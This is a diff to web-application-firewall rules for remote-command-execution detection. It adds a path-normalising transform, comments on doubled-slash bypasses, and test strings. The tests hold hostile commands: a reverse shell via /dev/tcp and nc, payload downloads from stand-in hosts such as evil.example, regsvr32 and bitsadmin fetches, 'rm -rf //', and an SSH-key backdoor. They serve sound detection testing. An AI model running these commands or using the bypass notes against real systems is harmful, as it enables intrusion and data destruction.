@@ -137,12 +137,19 @@ rules:
     targets:
       - collection: ARGS
       - collection: REQUEST_BODY
+    # normalizePath 在这里的作用是折叠"重复斜杠 / 点段"这类等价写法：
+    # `cmd //c whoami`、`whoami //all`、`rm -rf //`、`/etc//cron`、
+    # `bitsadmin //transfer` —— 实测这些变体都能绕过纯字面量匹配。
+    # 注意**只给这类"路径/选项字面量"规则挂**：带 URL scheme 的规则
+    # （`jndi:ldap://`、`gopher://`、`php://`、`http://`）不能挂 ——
+    # normalizePath 会把 `//` 折成 `/`，那正好把要匹配的形态毁掉。
     transforms:
       - urlDecode
       - urlDecode
       - replaceComments
       - compressWhitespace
       - lowercase
+      - normalizePath
     operator:
       name: pm
       params:
@@ -186,6 +193,8 @@ rules:
           - "wmic process call create"
     test:
       positive:
+        - "bitsadmin //transfer http://evil/x"
+        - "regsvr32 //s //u //i:http://evil/x"
         - ";wget http://evil.example/x.sh -O /tmp/x"
         - "curl http://169.254.169.254/latest/meta-data/"
         - "powershell -enc SQBFAFgA"
@@ -194,7 +203,6 @@ rules:
         - "please download the report from our website"
         - "the API is documented at https://example.com/docs"
         - "I will fetch the file later from the shared drive"
-
   - id: RCE-6005
     phase: 2
     severity: high
@@ -205,12 +213,19 @@ rules:
     targets:
       - collection: ARGS
       - collection: REQUEST_BODY
+    # normalizePath 在这里的作用是折叠"重复斜杠 / 点段"这类等价写法：
+    # `cmd //c whoami`、`whoami //all`、`rm -rf //`、`/etc//cron`、
+    # `bitsadmin //transfer` —— 实测这些变体都能绕过纯字面量匹配。
+    # 注意**只给这类"路径/选项字面量"规则挂**：带 URL scheme 的规则
+    # （`jndi:ldap://`、`gopher://`、`php://`、`http://`）不能挂 ——
+    # normalizePath 会把 `//` 折成 `/`，那正好把要匹配的形态毁掉。
     transforms:
       - urlDecode
       - urlDecode
       - replaceComments
       - compressWhitespace
       - lowercase
+      - normalizePath
     operator:
       name: pm
       params:
@@ -238,6 +253,9 @@ rules:
           - "base64 --decode"
     test:
       positive:
+        - "rm -rf //"
+        - "mkfifo //tmp/f"
+        - "/etc//cron.d/x"
         - "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
         - "echo ssh-rsa AAAAB3NzaC1yc2EAAA... >> /root/.ssh/authorized_keys"
         - "nc -e /bin/sh 10.0.0.1 4444"
@@ -246,7 +264,6 @@ rules:
         - "the systemd unit is enabled for the service"
         - "the deployment uses SSH keys stored in the vault"
         - "chmod is used to change file permissions"
-
   - id: RCE-6006
     phase: 2
     severity: high
@@ -257,12 +274,19 @@ rules:
     targets:
       - collection: ARGS
       - collection: REQUEST_BODY
+    # normalizePath 在这里的作用是折叠"重复斜杠 / 点段"这类等价写法：
+    # `cmd //c whoami`、`whoami //all`、`rm -rf //`、`/etc//cron`、
+    # `bitsadmin //transfer` —— 实测这些变体都能绕过纯字面量匹配。
+    # 注意**只给这类"路径/选项字面量"规则挂**：带 URL scheme 的规则
+    # （`jndi:ldap://`、`gopher://`、`php://`、`http://`）不能挂 ——
+    # normalizePath 会把 `//` 折成 `/`，那正好把要匹配的形态毁掉。
     transforms:
       - urlDecode
       - urlDecode
       - replaceComments
       - compressWhitespace
       - lowercase
+      - normalizePath
     operator:
       name: pm
       params:
@@ -290,6 +314,9 @@ rules:
           - "sc stop"
     test:
       positive:
+        - "cmd //c whoami"
+        - "whoami //all"
+        - "tasklist //v"
         - "cmd.exe /c whoami"
         - "net user hacker P@ssw0rd /add"
         - "ipconfig /all"
@@ -298,7 +325,6 @@ rules:
         - "the system information page is at /about"
         - "run the setup wizard to create an account"
         - "please check your network settings"
-
   - id: RCE-6007
     phase: 2
     severity: high
